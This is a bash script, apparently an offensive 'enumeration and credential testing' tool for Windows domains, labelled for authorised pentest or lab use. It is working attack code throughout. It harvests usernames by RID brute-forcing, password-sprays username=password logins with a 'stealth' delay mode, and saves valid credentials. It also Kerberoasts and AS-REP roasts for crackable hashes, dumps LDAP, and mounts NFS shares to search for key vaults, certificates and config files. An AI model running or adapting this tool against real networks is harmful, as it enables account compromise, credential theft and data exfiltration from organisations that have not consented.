#!/bin/bash

############################################################
# enum.sh — Initial Host Enumeration Script v1.7
# Profiles: Aggressive | Red Team Ops + Stealth
# For authorized penetration testing / lab use only.
############################################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BOLD='\033[1m'
NC='\033[0m'

function banner() {
    printf "${GREEN}======================================================\n"
    printf "      Automated Enumeration & Credential Testing v1.7\n"
    printf "======================================================${NC}\n"
}

function usage() { echo "Usage: $0 -i <IP>"; exit 1; }

function check_dependency() {
    command -v "$1" >/dev/null 2>&1 || {
        echo -e "${RED}[!] Missing dependency: $1${NC}"
        exit 1
    }
}

############################################################
# Parse arguments
############################################################
IP=""

while getopts "i:" opt; do
    case $opt in
        i) IP=$OPTARG ;;
        *) usage ;;
    esac
done

[ -z "$IP" ] && usage

banner

############################################################
# Mode selection: Aggressive | Red Team Ops + Stealth
############################################################
echo -e "${YELLOW}Choose operation mode:${NC}"
echo "1) Aggressive"
echo "2) Red Team Ops + Stealth"
read -p "Select (1/2): " MODE

case "$MODE" in
    1)
        echo -e "${GREEN}[+] Mode Selected: AGGRESSIVE${NC}"
        SPRAY_DELAY=0
        SPIDER_DOWNLOAD=true
        KERBEROS_ATTACKS=false
        ;;
    2)
        echo -e "${GREEN}[+] Mode Selected: RED TEAM OPS + STEALTH${NC}"
        SPRAY_DELAY=5      # seconds between attempts
        SPIDER_DOWNLOAD=true
        KERBEROS_ATTACKS=true
        ;;
    *)
        echo -e "${RED}[!] Invalid choice. Defaulting to RED TEAM OPS + STEALTH${NC}"
        SPRAY_DELAY=5
        SPIDER_DOWNLOAD=true
        KERBEROS_ATTACKS=true
        ;;
esac

echo -e "${YELLOW}[*] SPRAY DELAY: $SPRAY_DELAY sec between attempts${NC}"
echo -e "${YELLOW}[*] SPIDER DOWNLOAD: $SPIDER_DOWNLOAD${NC}"
echo -e "${YELLOW}[*] KERBEROS ATTACKS: $KERBEROS_ATTACKS${NC}"
echo ""

############################################################
# Dependency checks
############################################################
check_dependency "nmap"
check_dependency "nxc"

if [ "$KERBEROS_ATTACKS" = true ]; then
    # Impacket tools + ldapdomaindump for Red Team Ops
    check_dependency "GetNPUsers.py"
    check_dependency "GetUserSPNs.py"
    check_dependency "ldapdomaindump"
fi

OUTPUT_DIR="enum_$IP"
mkdir -p "$OUTPUT_DIR"

############################################################
# Nmap scan
############################################################
echo -e "${YELLOW}[*] Running Nmap scan...${NC}"
nmap -Pn -sCV -O -vv "$IP" -oN "$OUTPUT_DIR/nmap.txt"

echo -e "${GREEN}[+] Nmap scan complete${NC}"
grep -E "open" "$OUTPUT_DIR/nmap.txt" | tee "$OUTPUT_DIR/open_ports.txt"

############################################################
# OS Detection
############################################################
OS=$(grep "OS details" "$OUTPUT_DIR/nmap.txt" | awk -F': ' '{print $2}')
echo -e "${GREEN}[+] OS Detected: ${OS:-Unknown}${NC}"

############################################################
# Domain / DC Detection (RDP first, SMB fallback)
############################################################
DOMAIN=""
DC=""

# RDP-based detection via rdp-ntlm-info
if grep -q "3389/tcp open" "$OUTPUT_DIR/nmap.txt"; then
    echo -e "${YELLOW}[*] RDP detected — checking rdp-ntlm-info for domain/DC...${NC}"
    DC=$(grep "DNS_Computer_Name:" "$OUTPUT_DIR/nmap.txt" | awk -F': ' '{print $2}')
    DOMAIN=$(grep "DNS_Domain_Name:" "$OUTPUT_DIR/nmap.txt" | awk -F': ' '{print $2}')
    [ -n "$DOMAIN" ] && echo -e "${GREEN}[+] DOMAIN via RDP: $DOMAIN${NC}"
    [ -n "$DC" ] && echo -e "${GREEN}[+] DC via RDP: $DC${NC}"
fi

# SMB fallback for domain if still empty
if [ -z "$DOMAIN" ]; then
    echo -e "${YELLOW}[*] Falling back to SMB for domain discovery...${NC}"
    SMB_INFO=$(nxc smb "$IP" -u '' -p '' 2>/dev/null | grep -i "Domain" | head -1)
    DOMAIN=$(echo "$SMB_INFO" | awk -F'Domain: ' '{print $2}' | awk '{print $1}')
    [ -n "$DOMAIN" ] && echo -e "${GREEN}[+] DOMAIN via SMB: $DOMAIN${NC}"
fi

# /etc/hosts update if both known
if [ -n "$DOMAIN" ] && [ -n "$DC" ]; then
    echo -e "${YELLOW}[*] Updating /etc/hosts with $IP $DOMAIN $DC ...${NC}"
    echo "$IP $DOMAIN $DC" | sudo tee -a /etc/hosts >/dev/null
fi

############################################################
# SMB Shares: Null & Guest
############################################################
echo -e "${YELLOW}[*] Enumerating Null SMB Shares...${NC}"
nxc smb "$IP" -u '' -p '' --shares | tee "$OUTPUT_DIR/smb_null.txt"
NULL_ACCESS=$(grep -Ei "READ|WRITE" "$OUTPUT_DIR/smb_null.txt")

echo -e "${YELLOW}[*] Enumerating Guest SMB Shares...${NC}"
nxc smb "$IP" -u guest -p '' --shares | tee "$OUTPUT_DIR/smb_guest.txt"
GUEST_ACCESS=$(grep -Ei "READ|WRITE" "$OUTPUT_DIR/smb_guest.txt")

############################################################
# SMB Chain: RID brute -> user list -> spray -> loot
############################################################
function smb_chain() {
    AUTH="$1"         # "" or "guest"
    ACCESS_FLAG="$2"  # non-empty if any share allows read/write

    CREDFILE="$OUTPUT_DIR/users_${AUTH:-null}.txt"

    if [ -z "$ACCESS_FLAG" ]; then
        echo -e "${RED}[-] No SMB access for auth '$AUTH' — skipping RID brute / spray${NC}"
        return
    fi

    echo -e "${GREEN}[+] RID brute via SMB (auth='$AUTH')...${NC}"
    nxc smb "$IP" -u "$AUTH" -p '' --rid-brute | tee "$OUTPUT_DIR/rid_brute_${AUTH:-null}.txt"

    # Extract users from lines with (SidTypeUser)
    # Example line:
    #   ... 500: BABY2\Administrator (SidTypeUser)
    grep "(SidTypeUser)" "$OUTPUT_DIR/rid_brute_${AUTH:-null}.txt" \
        | awk -F': ' '{print $2}' \
        | sed -E 's/^[^\\]+\\//' \
        | awk '{print $1}' \
        > "$CREDFILE"

    if [ ! -s "$CREDFILE" ]; then
        echo -e "${RED}[-] No users extracted from RID brute for '$AUTH'${NC}"
        return
    fi

    echo -e "${GREEN}[+] Extracted $(wc -l < "$CREDFILE") users → $CREDFILE${NC}"

    ########################################################
    # Password Spray: username = password
    ########################################################
    echo -e "${YELLOW}[*] Password spraying username=password (auth='$AUTH')...${NC}"
    SPRAY_OUT="$OUTPUT_DIR/spray_${AUTH:-null}.txt"

    nxc smb "$IP" -u "$CREDFILE" -p "$CREDFILE" \
        --no-bruteforce --continue-on-success \
        --delay "$SPRAY_DELAY" \
        | tee "$SPRAY_OUT"

    # Extract successful creds:
    # Line example:
    #   ... [+] baby2.vl\Carl.Moore:Carl.Moore
    VALID_CREDS=$(grep "\[+\]" "$SPRAY_OUT" \
        | sed -E 's/.*\[\+\] //' \
        | sed -E 's/^[^\\]+\\//')

    if [ -n "$VALID_CREDS" ]; then
        echo -e "${BOLD}${RED}🔥 VALID CREDENTIALS FOUND (auth='$AUTH') 🔥${NC}"
        echo "$VALID_CREDS"
        echo "$VALID_CREDS" > "$OUTPUT_DIR/valid_creds_${AUTH:-null}.txt"
        echo -e "${GREEN}[+] Saved valid creds → $OUTPUT_DIR/valid_creds_${AUTH:-null}.txt${NC}"
    else
        echo -e "${YELLOW}[-] No successful logins during spray (auth='$AUTH')${NC}"
    fi

    ########################################################
    # SMB Spider / Download (optional by mode)
    ########################################################
    if [ "$SPIDER_DOWNLOAD" = true ]; then
        echo -e "${YELLOW}[*] Spidering SMB shares for loot (auth='$AUTH')...${NC}"
        mkdir -p "$OUTPUT_DIR/share_${AUTH:-null}"
        nxc smb "$IP" -u "$AUTH" -p '' \
            -M spider_plus -o DOWNLOAD_FLAG=True \
            -o OUTPUT_FOLDER="$OUTPUT_DIR/share_${AUTH:-null}"
    fi

    ########################################################
    # Kerberos / Domain Attacks (Red Team Ops mode)
    ########################################################
    if [ "$KERBEROS_ATTACKS" = true ] && [ -n "$DOMAIN" ] && [ -n "$DC" ]; then
        echo -e "${YELLOW}[*] Red Team Ops: Kerberos enumeration (auth='$AUTH')...${NC}"

        # AS-REP Roasting via Impacket GetNPUsers.py
        if [ -s "$CREDFILE" ]; then
            echo -e "${YELLOW}[*] Running AS-REP roast via GetNPUsers.py...${NC}"
            GetNPUsers.py "$DOMAIN"/ -dc-ip "$DC" \
                -usersfile "$CREDFILE" \
                -format hashcat \
                -outputfile "$OUTPUT_DIR/asrep_${AUTH:-null}.hashes" \
                2>&1 | tee "$OUTPUT_DIR/asrep_${AUTH:-null}.log"
        fi

        # SPN roasting + LDAP dump only if we have at least one valid credential
        if [ -s "$OUTPUT_DIR/valid_creds_${AUTH:-null}.txt" ]; then
            CREDS_LINE=$(head -n1 "$OUTPUT_DIR/valid_creds_${AUTH:-null}.txt")
            USERNAME=$(echo "$CREDS_LINE" | cut -d':' -f1)
            PASSWORD=$(echo "$CREDS_LINE" | cut -d':' -f2-)

            echo -e "${YELLOW}[*] Running SPN roast via GetUserSPNs.py using $USERNAME...${NC}"
            GetUserSPNs.py "$DOMAIN"/"$USERNAME":"$PASSWORD" -dc-ip "$DC" \
                -request \
                -outputfile "$OUTPUT_DIR/spn_${AUTH:-null}.hashes" \
                2>&1 | tee "$OUTPUT_DIR/spn_${AUTH:-null}.log"

            echo -e "${YELLOW}[*] Dumping LDAP domain info via ldapdomaindump...${NC}"
            ldapdomaindump "ldap://$DC" \
                -u "$DOMAIN\\$USERNAME" \
                -p "$PASSWORD" \
                -o "$OUTPUT_DIR/ldapdump_${AUTH:-null}" \
                2>&1 | tee "$OUTPUT_DIR/ldapdump_${AUTH:-null}.log"
        fi
    fi
}

# Execute for Null and Guest
smb_chain ""  "$NULL_ACCESS"
smb_chain "guest" "$GUEST_ACCESS"

############################################################
# NFS Detection, Auto-Mount, Loot, and Cheat-Sheet
############################################################
echo -e "${YELLOW}[*] Checking for NFS (2049/tcp)...${NC}"

declare -a MOUNTED_PATHS
EXPORTS=""

if grep -q "2049/tcp open" "$OUTPUT_DIR/nmap.txt"; then
    echo -e "${GREEN}[+] NFS service detected on $IP${NC}"
    check_dependency "showmount"

    EXPORTS=$(showmount -e "$IP" 2>/dev/null | grep -v "Export list")
    if [ -z "$EXPORTS" ]; then
        echo -e "${RED}[-] No NFS exports listed${NC}"
    else
        echo -e "${GREEN}[+] NFS Exports:${NC}"
        echo "$EXPORTS" | tee "$OUTPUT_DIR/nfs_shares.txt"

        while read -r SHARE _; do
            [ -z "$SHARE" ] && continue
            SHARE_CLEAN=$(echo "$SHARE" | sed 's/\///g')
            MOUNT_DIR="./nfs_mount_${IP}_${SHARE_CLEAN}"

            echo -e "${YELLOW}[*] Attempting to mount NFS share: $SHARE → $MOUNT_DIR${NC}"
            mkdir -p "$MOUNT_DIR"
            sudo mount -t nfs "$IP:$SHARE" "$MOUNT_DIR" 2>/dev/null

            if mount | grep -q "$MOUNT_DIR"; then
                echo -e "${GREEN}[MOUNTED] $MOUNT_DIR${NC}"
                MOUNTED_PATHS+=("$MOUNT_DIR")
                echo "$MOUNT_DIR" >> "$OUTPUT_DIR/nfs_mounted_paths.txt"

                # Loot hunt inside NFS
                find "$MOUNT_DIR" -maxdepth 4 \
                    \( -iname "*.kdbx" -o -iname "*.pfx" -o -iname "*.xml" -o -iname "*.ps1" -o -iname "*.config" \) \
                    | tee -a "$OUTPUT_DIR/nfs_loot_files.txt"
            else
                echo -e "${RED}[-] Failed to mount $SHARE${NC}"
                rmdir "$MOUNT_DIR"
            fi
        done <<< "$EXPORTS"
    fi
else
    echo -e "${YELLOW}[-] NFS not detected on $IP${NC}"
fi

############################################################
# Final Summary + Mount/Unmount Cheat Sheet
############################################################
echo -e "${GREEN}============================================${NC}"
echo -e "${GREEN}[DONE] Enumeration & Credential Testing Complete${NC}"
echo -e "${GREEN}Loot folder → $OUTPUT_DIR${NC}"
echo -e "${GREEN}============================================${NC}"

if [ ${#MOUNTED_PATHS[@]} -gt 0 ]; then
    echo -e "${BOLD}${YELLOW}📌 Mounted NFS Paths:${NC}"
    printf '%s\n' "${MOUNTED_PATHS[@]}"

    if [ -n "$EXPORTS" ]; then
        echo ""
        echo -e "${BOLD}${GREEN}📋 Re-mount Commands (copy-paste later):${NC}"
        while read -r SHARE _; do
            [ -z "$SHARE" ] && continue
            SHARE_CLEAN=$(echo "$SHARE" | sed 's/\///g')
            echo "sudo mount -t nfs $IP:$SHARE ./nfs_mount_${IP}_${SHARE_CLEAN}"
        done <<< "$EXPORTS"
    fi

    echo ""
    echo -e "${BOLD}${RED}🧹 Unmount Commands (cleanup):${NC}"
    for P in "${MOUNTED_PATHS[@]}"; do
        echo "sudo umount $P"
    done
    echo -e "${RED}⚠️ Remember to unmount & clean NFS mounts during debrief/cleanup.${NC}"
fi

echo ""
echo -e "${GREEN}✔ Script finished.${NC}"
